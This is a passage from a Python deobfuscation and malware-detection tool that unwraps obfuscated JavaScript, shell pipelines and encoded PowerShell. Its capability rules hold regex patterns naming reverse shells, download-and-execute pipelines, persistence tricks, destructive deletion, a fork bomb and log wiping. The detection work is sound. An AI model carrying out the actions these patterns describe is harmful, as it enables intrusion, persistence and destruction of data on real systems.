                except (ValueError, TypeError):
                    dec.append(s)
            if sum(decode.printable_ratio(d.encode("utf-8", "replace")) >= 0.9 for d in dec) >= 0.9 * len(dec):
                entries = dec
        _add_tell(report, "T-JS-STRING-TABLE", loc, "obfuscator.io-style string table", f"{len(best)} entries", "medium")
    body = f"string table ({len(entries)} entries; order may be rotated)\n" + "\n".join(e.replace("\n", " ") for e in entries)
    return [Unwrap(body.encode("utf-8"), "text", "string-table", "embedded", loc, "medium")]


def _js_detect_only(layer: Layer, report: Report) -> None:
    text = layer.text or ""
    loc = f"{layer.id}:1"
    nows = re.sub(r"\s+", "", text)
    if len(nows) >= 200 and sum(c in "[]()!+" for c in nows) / len(nows) >= 0.95:
        _add_tell(report, "T-JSFUCK", loc, "JSFuck encoding", "not statically decoded")
    if "ﾟωﾟﾉ" in text or "(ﾟДﾟ)" in text:
        _add_tell(report, "T-AAENCODE", loc, "aaencode encoding", "not statically decoded")
    if re.match(r"^\s*\w+=~\[\];\s*\w+=\{___:\+\+", text):
        _add_tell(report, "T-JJENCODE", loc, "jjencode encoding", "not statically decoded")


def _js_pretty(toks: list[Tok]) -> str:
    out: list[str] = []
    ind, par = 0, 0
    cur = ""
    for tk in toks:
        v = tk.value
        s = repr(v) if tk.kind == "str" else ("`..`" if tk.kind == "tmpl" else ("/%s/%s" % v if tk.kind == "regex" else str(v)))
        if tk.kind == "str":
            s = json.dumps(v, ensure_ascii=False)
        if tk.kind == "punct" and v == "(":
            par += 1
        elif tk.kind == "punct" and v == ")":
            par = max(0, par - 1)
        if tk.kind == "punct" and v == "}":
            if cur.strip():
                out.append("  " * ind + cur.strip())
            cur = ""
            ind = max(0, ind - 1)
        sep = "" if (not cur or tk.kind == "punct" and v in (".", ",", ";", ")", "]", "(", "[", ":") or cur.endswith(("(", "[", "."))) else " "
        cur += sep + s
        if tk.kind == "punct" and ((v == ";" and par == 0) or v == "{"):
            out.append("  " * ind + cur.strip())
            cur = ""
            if v == "{":
                ind += 1
        elif tk.kind == "punct" and v == "}":
            out.append("  " * ind + cur.strip())
            cur = ""
    if cur.strip():
        out.append("  " * ind + cur.strip())
    return "\n".join(out)


def _js_detect(layer: Layer, report: Report, opts: Options) -> list[Unwrap]:
    text = layer.text or ""
    notes: list[str] = []
    toks = js_tokenize(text, notes)
    for n in notes:
        if n not in report.notes:
            report.notes.append(f"{layer.id}: {n}")
    layer.meta["_toks"] = toks
    lines = text.split("\n")
    if lines and max(len(x) for x in lines) > 500 and len(lines) < 10 and toks:
        layer.view = _js_pretty(toks)
    _js_detect_only(layer, report)
    out = _js_packer(layer, toks, report)
    if out:
        pass
    out += _js_string_table(layer, toks, report)
    fold = JsFolder(toks)
    _js_env(toks, fold)
    n = len(toks)
    packer_spans = [(m.start(), m.end()) for m in re.finditer(r"eval\(function\(p,a,c,k,e,[rd]\)", text)]
    for i, tk in enumerate(toks):
        if tk.kind != "ident":
            continue
        prev = toks[i - 1] if i else None
        nxt = toks[i + 1] if i + 1 < n else None
        v = tk.value
        loc = f"{layer.id}:{tk.line}" + (f":c{tk.col}" if len(lines[tk.line - 1]) > 200 else "")
        sink: str | None = None
        argpos = i + 1
        if v == "eval" and nxt and nxt.value == "(" and (prev is None or prev.value != "." or (i >= 2 and toks[i - 2].value in _JS_NS)):
            if any(a <= tk.start <= b for a, b in packer_spans):
                continue
            sink = "eval"
        elif v == "eval" and prev and prev.value == "," and nxt and nxt.value == ")" and i + 2 < n and toks[i + 2].value == "(":
            sink, argpos = "eval", i + 2
        elif v == "Function" and nxt and nxt.value == "(":
            sink = "Function"
        elif v == "constructor" and nxt and nxt.value == "(" and prev and prev.value == "." and i >= 2 and toks[i - 2].value == "constructor":
            sink = "Function"
        elif v in ("setTimeout", "setInterval") and nxt and nxt.value == "(":
            sink = v
        elif v in ("write", "writeln") and prev and prev.value == "." and i >= 2 and toks[i - 2].value == "document" and nxt and nxt.value == "(":
            sink = "document.write"
        elif v in ("exec", "execSync", "spawn") and prev and prev.value == "." and nxt and nxt.value == "(":
            sink = "shell"
        elif v == "innerHTML" and nxt and nxt.value == "=":
            sink, argpos = "innerHTML", i + 2
        elif v in _JS_NS and nxt and nxt.value == "[":
            nm, p2 = fold.fold_at(i + 2)
            if isinstance(nm, str) and nm in ("eval", "Function") and p2 < n and toks[p2].value == "]" and p2 + 1 < n and toks[p2 + 1].value == "(":
                _add_tell(report, "T-GETATTR-STRING", loc, "global attribute resolved from computed string", f"resolves to {nm!r}", "medium")
                sink, argpos = nm, p2 + 1
        elif v == "require" and nxt and nxt.value == "(":
            a, _ = fold.args_at(i + 1)
            if not a or not isinstance(a[0], str):
                _add_tell(report, "T-IMPORT-DYNAMIC", loc, "dynamic require", "non-literal module name", "medium")
        if sink is None:
            continue
        if sink == "innerHTML":
            val, _ = fold.fold_at(argpos)
            vals = [val]
        else:
            vals, _ = fold.args_at(argpos)
        if not vals:
            continue
        if sink == "Function":
            val = vals[-1]
        elif sink == "shell" and False:
            val = vals[0]
        else:
            val = vals[0]
        if sink in ("setTimeout", "setInterval") and (isinstance(val, JsCb) or val is UNKNOWN):
            continue
        if val is UNKNOWN:
            if sink in ("eval", "Function"):
                _add_tell(report, "T-DYN-EXEC", loc, "dynamic code with unresolved argument", f"{sink}(<non-literal>)", "medium")
            continue
        if not isinstance(val, (str, bytes)):
            continue
        ch = _chain(val)
        kind = " -> ".join(ch) or "literal"
        if sink == "shell" and not ch and len(val) < 200:
            continue
        raw = val if isinstance(val, bytes) else val.encode("latin-1" if ("b64" in ch or "hex" in ch) and all(ord(c) < 256 for c in val) else "utf-8", "replace")
        lang = {"document.write": "html", "innerHTML": "html", "shell": "sh"}.get(sink, "js")
        if ch:
            _add_tell(report, "T-DECODE-EXEC", loc, f"decode chain feeds {sink}", f"{kind} -> {sink}")
        via = {"Function": "Function", "document.write": "document.write", "innerHTML": "document.write",
               "shell": "bash-c"}.get(sink, "eval")
        out.append(Unwrap(raw, lang, kind, via, loc))
    # embedded decoded literals (atob etc. never reaching a sink)
    return out


def _html_detect(layer: Layer, report: Report, opts: Options) -> list[Unwrap]:
    text = layer.text or ""
    out = []
    for m in re.finditer(r"<script\b[^>]*>(.*?)</script\s*>", text, re.S | re.I):
        body = m.group(1)
        if body.strip():
            out.append(Unwrap(body.encode("utf-8"), "js", "html-script", "embedded", f"{layer.id}:{_line_of(text, m.start(1))}"))
    handlers = re.findall(r"""\bon\w+\s*=\s*(?:"([^"]*)"|'([^']*)')""", text, re.I)
    if handlers:
        out.append(Unwrap("\n".join(a or b for a, b in handlers).encode(), "js", "html-handlers", "embedded", f"{layer.id}:1"))
    return out


# ---------- shell
_ANSI_ESC = {"n": "\n", "t": "\t", "r": "\r", "\\": "\\", "'": "'", '"': '"', "a": "\a", "b": "\b", "e": "\x1b", "f": "\f", "v": "\v"}


def _ansi_c(s: str) -> str:
    out: list[str] = []
    i = 0
    while i < len(s):
        c = s[i]
        if c == "\\" and i + 1 < len(s):
            d = s[i + 1]
            if d == "x" and re.fullmatch(r"[0-9a-fA-F]{1,2}", s[i + 2:i + 4].rstrip("'\\") or "z"):
                m = re.match(r"[0-9a-fA-F]{1,2}", s[i + 2:])
                out.append(chr(int(m.group(), 16)))
                i += 2 + len(m.group())
                continue
            if d in "01234567":
                m = re.match(r"[0-7]{1,3}", s[i + 1:])
                out.append(chr(int(m.group(), 8) & 0xFF))
                i += 1 + len(m.group())
                continue
            out.append(_ANSI_ESC.get(d, "\\" + d))
            i += 2
            continue
        out.append(c)
        i += 1
    return "".join(out)


def _sh_split(s: str, ops: tuple[str, ...]) -> list[str]:
    """Split ``s`` on unquoted operators (longest first), honouring quotes, $( ) and backticks."""
    parts: list[str] = []
    cur: list[str] = []
    i, n, depth = 0, len(s), 0
    q = ""
    while i < n:
        c = s[i]
        if q == "'":
            cur.append(c)
            if c == "'":
                q = ""
            i += 1
            continue
        if q == '"':
            cur.append(c)
            if c == "\\" and i + 1 < n:
                cur.append(s[i + 1])
                i += 2
                continue
            if c == '"':
                q = ""
            i += 1
            continue
        if c == "\\" and i + 1 < n:
            cur.append(s[i:i + 2])
            i += 2
            continue
        if c in "'\"":
            if c == "'" and i > 0 and s[i - 1] == "$":
                pass
            q = c
            cur.append(c)
            i += 1
            continue
        if c == "`":
            j = s.find("`", i + 1)
            j = n - 1 if j < 0 else j
            cur.append(s[i:j + 1])
            i = j + 1
            continue
        if s.startswith("$(", i):
            depth += 1
            cur.append("$(")
            i += 2
            continue
        if depth and c == "(":
            depth += 1
        elif depth and c == ")":
            depth -= 1
        if depth == 0:
            hit = next((o for o in ops if s.startswith(o, i)), None)
            if hit:
                if hit == "&" and ((cur and cur[-1][-1:] in ">&<") or s[i + 1:i + 2] in (">",)):
                    hit = None
                elif hit == "|" and (s[i + 1:i + 2] == "|" or (cur and cur[-1][-1:] == "|")):
                    hit = None
            if hit:
                parts.append("".join(cur))
                cur = []
                i += len(hit)
                continue
        cur.append(c)
        i += 1
    parts.append("".join(cur))
    return [p for p in parts if p.strip()]


def _sh_expand(s: str, env: dict[str, str]) -> tuple[str, list[str]]:
    """Expand $NAME / ${NAME} / $IFS outside single quotes and decode $'..' strings."""
    out: list[str] = []
    chain: list[str] = []
    i, n, q = 0, len(s), ""
    while i < n:
        c = s[i]
        if q == "'":
            out.append(c)
            if c == "'":
                q = ""
            i += 1
            continue
        if c == "$" and s[i + 1:i + 2] == "'" and q != '"':
            j = i + 2
            while j < n and not (s[j] == "'" and s[j - 1] != "\\"):
                j += 1
            lit = _ansi_c(s[i + 2:j])
            out.append("'" + lit.replace("'", "'\\''") + "'")
            chain.append("ansi-c")
            i = j + 1
            continue
        if c == "'" and q == "":
            q = "'"
            out.append(c)
            i += 1
            continue
        if c == '"':
            q = "" if q == '"' else '"'
            out.append(c)
            i += 1
            continue
        if c == "\\" and i + 1 < n:
            out.append(s[i:i + 2])
            i += 2
            continue
        if c == "$":
            m = re.match(r"\$\{(\w+)\}|\$(\w+)", s[i:])
            if m:
                nm = m.group(1) or m.group(2)
                if nm == "IFS":
                    out.append(" ")
                    i += m.end()
                    continue
                if nm in env:
                    out.append(env[nm])
                    chain.append("var")
                    i += m.end()
                    continue
        out.append(c)
        i += 1
    return "".join(out), chain


def _sh_argv(cmd: str) -> list[str]:
    try:
        return shlex.split(cmd, posix=True)
    except ValueError:
        return cmd.split()


_TR_RANGE = re.compile(r"(.)-(.)")


def _tr_expand(sset: str) -> str:
    return _TR_RANGE.sub(lambda m: "".join(chr(c) for c in range(ord(m.group(1)), ord(m.group(2)) + 1)), sset)


def _sh_source(argv: list[str], heredoc: str | None, env: dict[str, str]) -> tuple[bytes | None, str]:
    if not argv:
        return None, ""
    c = os.path.basename(argv[0])
    if c == "echo":
        args = argv[1:]
        nl, esc = True, False
        while args and re.fullmatch(r"-[neE]+", args[0]):
            nl = nl and "n" not in args[0]
            esc = esc or "e" in args[0]
            args = args[1:]
        s = " ".join(args)
        return ((_ansi_c(s) if esc else s) + ("\n" if nl else "")).encode("latin-1", "replace"), "echo"
    if c == "printf" and len(argv) >= 2:
        fmt, rest = argv[1], argv[2:]
        if re.search(r"%[^sb%]", fmt):
            return None, ""
        it = iter(rest)
        res = re.sub(r"%([sb%])", lambda m: "%" if m.group(1) == "%" else next(it, ""), fmt)
        return _ansi_c(res).encode("latin-1", "replace"), "printf-escape"
    if c == "cat" and heredoc is not None:
        return heredoc.encode("utf-8"), "heredoc"
    return None, ""


def _sh_transform(argv: list[str], data: bytes) -> tuple[bytes | None, str]:
    if not argv:
        return None, ""
    c = os.path.basename(argv[0])
    fl = " ".join(argv[1:])
    try:
        if c == "base64" and re.search(r"(^| )(-d|-di|-D|--decode)( |$)", fl):
            return transform("b64", data.decode("latin-1")), "b64"
        if c == "openssl" and "base64" in fl and re.search(r"-d|-a", fl):
            return transform("b64", data.decode("latin-1")), "b64"
        if c == "base32" and "-d" in fl:
            return transform("b32", data.decode("latin-1")), "b32"
        if c == "xxd" and "-r" in fl and "-p" in fl:
            return transform("hex", data.decode("latin-1")), "hex"
        if c in ("gunzip", "zcat", "gzip") and (c != "gzip" or "-d" in fl):
            return transform("gzip", data), "gzip"
        if c in ("bzcat", "bzip2") and (c != "bzip2" or "-d" in fl):
            return transform("bz2", data), "bz2"
        if c in ("xzcat", "xz") and (c != "xz" or "-d" in fl):
            return transform("xz", data), "xz"
        if c == "rev":
            return b"\n".join(x[::-1] for x in data.split(b"\n")), "reverse"
        if c == "tr" and len(argv) >= 3 and not fl.startswith("-"):
            a, b = _tr_expand(argv[1]), _tr_expand(argv[2])
            return data.decode("latin-1").translate(str.maketrans(a, b[:len(a)].ljust(len(a), b[-1:] or " "))).encode("latin-1"), "tr"
        if c == "sed" and len(argv) >= 2:
            m = re.fullmatch(r"s/([\w ]+)/([\w ]*)/g?", argv[1])
            if m:
                return data.replace(m.group(1).encode(), m.group(2).encode()), "sed"
    except (TransformError, ValueError):
        return None, ""
    return None, ""


_SH_SHELLS = {"sh", "bash", "zsh", "dash", "ash", "ksh"}
_SH_INTERP = {"python": "py", "python2": "py", "python3": "py", "node": "js", "perl": "text", "php": "text"}


def _sh_sink_lang(argv: list[str]) -> str | None:
    if not argv:
        return None
    c = os.path.basename(argv[0])
    rest = argv[1:]
    if c in _SH_SHELLS and (not rest or rest in (["-s"], ["-"], ["-s", "-"])):
        return "sh"
    if c in ("source", ".") and rest[:1] == ["/dev/stdin"]:
        return "sh"
    if c in _SH_INTERP and (not rest or rest == ["-"]):
        return _SH_INTERP[c]
    return None


def _sh_fold_pipeline(pipe: str, heredocs: dict[str, str], env: dict[str, str]) -> tuple[bytes | None, list[str], list[str] | None]:
    """Fold ``source | transform*`` -> (bytes, chain, sink argv or None)."""
    segs = _sh_split(pipe, ("|",))
    if not segs:
        return None, [], None
    hd = None
    m = re.search(r"<<-?\s*['\"]?(\w+)['\"]?", segs[0])
    if m and m.group(1) in heredocs:
        hd = heredocs[m.group(1)]
        segs[0] = segs[0][:m.start()]
    herestr = re.search(r"<<<\s*(.+)$", segs[0])
    if herestr:
        sv = _sh_argv(herestr.group(1))
        hd = (sv[0] if sv else "") + "\n"
        segs[0] = segs[0][:herestr.start()]
    argv0 = _sh_argv(segs[0])
    data, src = _sh_source(argv0, hd, env)
    chain: list[str] = []
    if src in ("printf-escape",):
        chain.append(src)
    if data is None:
        return None, [], None
    sink = None
    for idx, seg in enumerate(segs[1:], 1):
        argv = _sh_argv(seg)
        if idx == len(segs) - 1 and _sh_sink_lang(argv):
            sink = argv
            break
        res, name = _sh_transform(argv, data)
        if res is None:
            return None, [], None
        data = res
        chain.append(name)
    return data, chain, sink


def _sh_logical_lines(text: str) -> list[tuple[int, str, dict[str, str]]]:
    lines = text.split("\n")
    out: list[tuple[int, str, dict[str, str]]] = []
    i = 0
    while i < len(lines):
        ln = i + 1
        cur = lines[i]
        while cur.endswith("\\") and i + 1 < len(lines):
            i += 1
            cur = cur[:-1] + lines[i]
        hds: dict[str, str] = {}
        for m in re.finditer(r"<<(-?)\s*['\"]?(\w+)['\"]?", cur):
            if cur[m.start() - 1:m.start()] == "<" or cur[m.end():m.end() + 1] == "<":
                continue
            body: list[str] = []
            j = i + 1
            while j < len(lines) and (lines[j].strip() if m.group(1) else lines[j]) != m.group(2):
                body.append(lines[j].lstrip("\t") if m.group(1) else lines[j])
                j += 1
            hds[m.group(2)] = "\n".join(body) + "\n"
            i = j
        out.append((ln, cur, hds))
        i += 1
    return out


def _sh_detect(layer: Layer, report: Report, opts: Options) -> list[Unwrap]:
    text = layer.text or ""
    out: list[Unwrap] = []
    env: dict[str, str] = {}
    depth = 0
    for ln, line, hds in _sh_logical_lines(text):
        s = line.strip()
        if not s or s.startswith("#"):
            continue
        if re.match(r"(if|for|while|until|case)\b", s) or re.search(r"\{\s*$|\bthen$|\bdo$", s):
            depth += 1
        if re.match(r"(fi|done|esac)\b|\}\s*$", s):
            depth = max(0, depth - 1)
        loc = f"{layer.id}:{ln}"
        for cmd in _sh_split(line, (";", "&&", "||", "&", "\n")):
            m = re.match(r"\s*(?:export\s+)?([A-Za-z_]\w*)=(.*)$", cmd)
            if m and depth == 0:
                v, _ch = _sh_expand(m.group(2).strip(), env)
                av = _sh_argv(v)
                if len(av) <= 1:
                    env[m.group(1)] = av[0] if av else ""
                continue
            expanded, xch = _sh_expand(cmd, env)
            segs = _sh_split(expanded, ("|",))
            # pipeline: source | transforms | sink
            if len(segs) >= 2:
                data, chain, sink = _sh_fold_pipeline(expanded, hds, env)
                if data is not None and sink is not None:
                    lang = _sh_sink_lang(sink) or "sh"
                    full = [c for c in xch if c != "var"] + chain
                    kind = " -> ".join(full) or "literal"
                    if chain:
                        _add_tell(report, "T-SHELL-PIPE-EXEC", loc, "decoded data piped into an interpreter", f"{kind} | {os.path.basename(sink[0])}")
                        _add_tell(report, "T-DECODE-EXEC", loc, "decode chain feeds shell", kind)
                    out.append(Unwrap(data, lang, kind, "pipe-sh", loc))
                    continue
                if data is not None and chain:
                    m2 = re.search(r">\s*(\S+)\s*$", expanded)
                    if m2 and len(data) >= 64 and _looks_like_code(data):
                        out.append(Unwrap(data, None, " -> ".join(chain), "embedded", loc, "medium"))
                    continue
                if re.search(r"\b(?:curl|wget)\b", segs[0]) and _sh_sink_lang(_sh_argv(segs[-1])):
                    _add_tell(report, "T-DOWNLOAD-EXEC", loc, "download piped into an interpreter", _snip(expanded, 90))
            argv = _sh_argv(expanded.strip())
            while argv and re.fullmatch(r"\w+=.*", argv[0]):
                argv = argv[1:]
            if not argv:
                continue
            c = os.path.basename(argv[0])
            arg: str | None = None
            via = ""
            lang = "sh"
            if c in ("eval",) and len(argv) >= 2:
                arg, via = " ".join(argv[1:]), "eval"
            elif c in _SH_SHELLS and len(argv) >= 3 and argv[1] == "-c":
                arg, via = argv[2], "bash-c"
            elif c in ("python", "python2", "python3") and len(argv) >= 3 and argv[1] == "-c":
                arg, via, lang = argv[2], "bash-c", "py"
            elif c == "node" and len(argv) >= 3 and argv[1] in ("-e", "--eval"):
                arg, via, lang = argv[2], "bash-c", "js"
            elif c in ("perl",) and len(argv) >= 3 and argv[1] == "-e":
                arg, via, lang = argv[2], "bash-c", "text"
            elif re.match(r"(powershell|pwsh)", c):
                for k, a in enumerate(argv):
                    if re.fullmatch(r"-e(nc(odedcommand)?)?", a, re.I) and k + 1 < len(argv):
                        try:
                            out.append(Unwrap(transform("b64", argv[k + 1]).decode("utf-16le", "replace").encode(), "ps1", "b64 -> utf16le", "bash-c", loc))
                            _add_tell(report, "T-DECODE-EXEC", loc, "encoded PowerShell command", "b64 -> utf16le")
                        except TransformError:
                            pass
            if arg is None:
                continue
            ch = list(xch)
            m3 = re.fullmatch(r"\s*(?:\$\((.*)\)|`(.*)`)\s*", arg, re.S)
            if m3:
                inner = m3.group(1) or m3.group(2)
                if re.search(r"\b(?:curl|wget)\b", inner):
                    _add_tell(report, "T-DOWNLOAD-EXEC", loc, "downloaded text passed to a shell", _snip(inner, 90))
                    continue
                data, chain, snk = _sh_fold_pipeline(inner, hds, env)
                if data is None or snk is not None:
                    continue
                ch += chain
                arg_b = data
            else:
                arg_b = arg.encode("utf-8", "replace")
            if not ch and len(arg_b) < 200 and lang == "sh":
                continue
            kind = " -> ".join(ch) or "literal"
            if ch:
                _add_tell(report, "T-DECODE-EXEC", loc, f"decode chain feeds {c}", kind)
            out.append(Unwrap(arg_b, lang, kind, via, loc))
    return out


# ---------- PowerShell
def _ps1_detect(layer: Layer, report: Report, opts: Options) -> list[Unwrap]:
    text = layer.text or ""
    out: list[Unwrap] = []
    for m in re.finditer(r"(?i)-(?:e|enc|encodedcommand)\s+([A-Za-z0-9+/=]{16,})", text):
        try:
            out.append(Unwrap(transform("b64", m.group(1)).decode("utf-16le", "replace").encode(), "ps1", "b64 -> utf16le", "bash-c", f"{layer.id}:{_line_of(text, m.start())}"))
        except TransformError:
            pass
    for m in re.finditer(r"""(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(UTF8|Unicode|ASCII)\.GetString\(\s*\[(?:System\.)?Convert\]::FromBase64String\(\s*['"]([A-Za-z0-9+/=]+)['"]""", text):
        try:
            raw = transform("b64", m.group(2))
            enc = "utf-16le" if m.group(1).lower() == "unicode" else "utf-8"
            out.append(Unwrap(raw.decode(enc, "replace").encode(), "ps1", f"b64 -> {enc}", "eval", f"{layer.id}:{_line_of(text, m.start())}"))
            _add_tell(report, "T-DECODE-EXEC", f"{layer.id}:{_line_of(text, m.start())}", "base64 text passed to Invoke-Expression", "b64")
        except TransformError:
            pass
    return out


# ---------- capability rules
@dataclass
class Rule:
    id: str
    lang: str
    category: str
    severity: str
    pattern: str
    phrase: str
    tell: str | None = None


# Python call rules: fully-qualified callee fnmatch patterns
PY_CALL_RULES: list[Rule] = [
    Rule("PY-EXEC-DYN", "py", "DYNAMIC_CODE", "high", "builtins.exec|builtins.eval|builtins.compile", "executes dynamic code ({arg})"),
    Rule("PY-SUBPROC", "py", "EXEC", "medium", "os.system|os.popen|os.exec*|os.spawn*|subprocess.*|pty.spawn|commands.getoutput", "runs command {arg}"),
    Rule("PY-SOCKET", "py", "NETWORK", "medium", "socket.socket|socket.create_connection", "opens socket"),
    Rule("PY-HTTP", "py", "NETWORK", "medium", "urllib.request.*|urllib2.*|requests.*|http.client.*|httpx.*|aiohttp.*|ftplib.*|smtplib.*|paramiko.*", "HTTP/remote request to {arg}"),
    Rule("PY-OPEN-R", "py", "FILE_READ", "low", "builtins.open", "reads file {arg}"),
    Rule("PY-DELETE", "py", "FILE_DELETE", "medium", "os.remove|os.unlink|shutil.rmtree|os.rmdir", "deletes {arg}"),
    Rule("PY-WRITE", "py", "FILE_WRITE", "medium", "shutil.copy*|shutil.move|os.rename", "writes file {arg}"),
    Rule("PY-CRYPTO", "py", "CRYPTO", "low", "hashlib.*|hmac.*|Crypto.*|Cryptodome.*|cryptography.*|nacl.*|secrets.*", "hashes/encrypts with {callee}"),
    Rule("PY-ENCODE", "py", "ENCODING", "info", "base64.*|binascii.*|codecs.*|zlib.*", "encodes/decodes data ({callee})"),
    Rule("PY-INPUT", "py", "INPUT", "info", "builtins.input|raw_input|getpass.getpass|sys.stdin.*", "reads user input"),
    Rule("PY-RECON", "py", "RECON", "low", "platform.*|os.uname|socket.gethostname|getpass.getuser|os.getlogin|os.getuid", "collects host info ({callee})"),
    Rule("PY-ANTIDBG", "py", "ANTI_ANALYSIS", "medium", "sys.gettrace|sys.settrace", "checks for debugger/tracing", "T-ANTI-DEBUG"),
    Rule("PY-CTYPES", "py", "MEMORY_EXEC", "high", "ctypes.*VirtualAlloc*|ctypes.memmove|ctypes.CFUNCTYPE|ctypes.*mprotect*", "allocates/executes native memory", "T-MEMORY-EXEC"),
    Rule("PY-REG", "py", "PERSISTENCE", "high", "winreg.SetValue*|_winreg.SetValue*", "writes registry key {arg}", "T-PERSIST"),
    Rule("PY-OUTPUT", "py", "OUTPUT", "info", "builtins.print", "prints output"),
]
# instance methods (module must be imported in the same layer)
PY_METHOD_RULES: list[tuple[str, str, str, str, str, str]] = [
    # (rule id, required module, method regex, category, severity, phrase)
    ("PY-SOCKET", "socket", r"connect|connect_ex", "NETWORK", "medium", "connects to {arg}"),
    ("PY-SOCKET", "socket", r"bind", "NETWORK", "medium", "listens on {arg}"),
    ("PY-SOCKET", "socket", r"listen|accept", "NETWORK", "medium", "listens for connections"),
    ("PY-SOCKET", "socket", r"send|sendall|sendto", "NETWORK", "medium", "sends data"),
    ("PY-SOCKET", "socket", r"recv|recvfrom", "NETWORK", "medium", "receives data"),
    ("PY-WRITE", "pathlib", r"write_text|write_bytes", "FILE_WRITE", "medium", "writes file {arg}"),
    ("PY-OPEN-R", "pathlib", r"read_text|read_bytes", "FILE_READ", "low", "reads file {arg}"),
    ("PY-DELETE", "pathlib", r"unlink", "FILE_DELETE", "medium", "deletes {arg}"),
]
_PY_TELL_BY_CAT = {"PERSISTENCE": "T-PERSIST", "CREDENTIALS": "T-CRED-ACCESS", "PRIVESC": "T-PRIVESC",
                   "DESTRUCTIVE": "T-DESTRUCTIVE", "MEMORY_EXEC": "T-MEMORY-EXEC"}

# line rules (JS / shell / PowerShell / any-string): regex on source lines
LINE_RULES: list[Rule] = [
    Rule("JS-FETCH", "js", "NETWORK", "medium", r"\bfetch\s*\(\s*(?P<arg>[^,)]*)|\bXMLHttpRequest\b|sendBeacon|new\s+WebSocket|\$\.(?:ajax|get|post)\(|\baxios\.|https?\.(?:request|get)\(|\bnet\.connect", "sends request to {arg}"),
    Rule("JS-CHILD", "js", "EXEC", "high", r"child_process|\b(?:execSync|spawnSync)\s*\(|\.(?:exec|spawn|fork)\s*\(\s*(?P<arg>[^,)]*)", "runs command {arg}"),
    Rule("JS-FS-R", "js", "FILE_READ", "low", r"\bfs\.(?:readFile|readFileSync|readdir)\w*\s*\(\s*(?P<arg>[^,)]*)", "reads file {arg}"),
    Rule("JS-FS-W", "js", "FILE_WRITE", "medium", r"\bfs\.(?:writeFile|appendFile)\w*\s*\(\s*(?P<arg>[^,)]*)", "writes file {arg}"),
    Rule("JS-FS-D", "js", "FILE_DELETE", "medium", r"\bfs\.(?:unlink|rm|rmdir)\w*\s*\(\s*(?P<arg>[^,)]*)", "deletes {arg}"),
    Rule("JS-COOKIE", "js", "CREDENTIALS", "high", r"document\.cookie|\blocalStorage\b|\bsessionStorage\b|\bindexedDB\b|navigator\.credentials", "reads browser storage ({arg})", "T-CRED-ACCESS"),
    Rule("JS-DOM-REDIRECT", "js", "OUTPUT", "low", r"(?:window\.)?location(?:\.href)?\s*=[^=]|document\.write|\.innerHTML\s*=", "rewrites page / redirects"),
    Rule("JS-EVAL", "js", "DYNAMIC_CODE", "high", r"\beval\s*\(|\bnew\s+Function\s*\(|\bFunction\s*\(|setTimeout\s*\(\s*['\"]", "executes dynamic code"),
    Rule("JS-DEBUGGER", "js", "ANTI_ANALYSIS", "medium", r"\bdebugger\b", "anti-debug: debugger trap", "T-ANTI-DEBUG"),
    Rule("JS-CRYPTO", "js", "CRYPTO", "low", r"crypto\.subtle|CryptoJS\.|require\(['\"]crypto['\"]\)|createCipher\w*|createHash", "uses crypto ({arg})"),
    Rule("JS-ENV", "js", "RECON", "low", r"process\.env|os\.hostname|os\.userInfo|navigator\.userAgent", "collects host/browser info"),
    Rule("SH-REVSHELL", "sh", "EXEC", "high", r"bash\s+-i\s*>&\s*/dev/(?:tcp|udp)/(?P<arg>[\w.]+/\d+)|\b(?:nc|ncat)\b[^|;\n]*\s-e\b|mkfifo[^\n]*\bnc\b|socat[^\n]*exec:", "reverse shell to {arg}", "T-REVSHELL"),
    Rule("SH-DLEXEC", "sh", "DOWNLOAD", "high", r"\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:ba|z|da)?sh\b|(?:ba)?sh\s+<\(\s*(?:curl|wget)", "downloads and executes script", "T-DOWNLOAD-EXEC"),
    Rule("SH-PERSIST", "sh", "PERSISTENCE", "high", r"\bcrontab\b|/etc/cron|systemctl\s+enable|\.service\b|>>?\s*~?/?[\w./]*\.(?:bashrc|profile|zshrc)|/etc/rc\.local|authorized_keys|ld\.so\.preload", "persistence via {arg}", "T-PERSIST"),
    Rule("SH-PRIVESC", "sh", "PRIVESC", "medium", r"\bsudo\b|chmod\s+(?:[ugo]*\+s|4755)|\bsetcap\b|/etc/sudoers", "privilege change: {arg}", "T-PRIVESC"),
    Rule("SH-DESTRUCT", "sh", "DESTRUCTIVE", "high", r"\brm\s+-\w*[rR]\w*[fF]\w*\s+(?:/|~|\*)|\brm\s+-\w*[fF]\w*[rR]\w*\s+(?:/|~|\*)|\bshred\b|\bdd\b[^\n]*of=/dev/|\bmkfs\b|:\(\)\s*\{\s*:\|:&\s*\};:", "destructive: {arg}", "T-DESTRUCTIVE"),
    Rule("SH-ANTIFOR", "sh", "ANTI_ANALYSIS", "medium", r"history\s+-c|unset\s+HISTFILE|HISTFILE=/dev/null|>\s*/var/log/|\brm\b[^\n]*\.log\b|\btouch\s+-r\b", "covers tracks: {arg}", "T-ANTI-FORENSICS"),
    Rule("SH-NET", "sh", "NETWORK", "medium", r"(?<![\w-])(?:curl|wget|nc|ncat|socat|telnet|ssh|scp|ftp)\s[^\n|;]*|/dev/(?:tcp|udp)/", "network: {arg}"),
    Rule("SH-RECON", "sh", "RECON", "low", r"(?:^|[;|&(]\s*|\bdo\s+)(?:id|whoami|uname|hostname|ifconfig|ip\s+a|env|ps)(?=\s|$|;|\))|cat\s+/etc/passwd", "recon: {arg}"),
    Rule("SH-FILES-W", "sh", "FILE_WRITE", "medium", r"(?<![>&\d])>>?\s*(?!/dev/|&)(?P<arg>[~/.\w][^\s;|&]*)|\btee\s+(?:-a\s+)?(?P<arg2>\S+)|\bcp\s+\S+\s+(?P<arg3>\S+)", "writes {arg}"),
    Rule("SH-FILES-D", "sh", "FILE_DELETE", "medium", r"\brm\s+(?:-\w+\s+)*(?P<arg>\S+)", "deletes {arg}"),
    Rule("SH-CHMODX", "sh", "FILE_WRITE", "medium", r"\bchmod\s+(?:[ugoa]*\+x|[0-7]*[1357][0-7]{0,2})\s+(?P<arg>\S+)", "makes executable {arg}"),
    Rule("SH-CRYPTO", "sh", "CRYPTO", "low", r"\bopenssl\s+enc\b|\bgpg\b|\bsha\d*sum\b|\bmd5sum\b", "crypto: {arg}"),
    Rule("SH-BG", "sh", "EXEC", "low", r"\bnohup\b|\bsetsid\b|\bdisown\b", "runs in background"),
    Rule("SH-BASE64", "sh", "ENCODING", "info", r"\bbase64\b|\bxxd\s+-r\b", "decodes data ({arg})"),
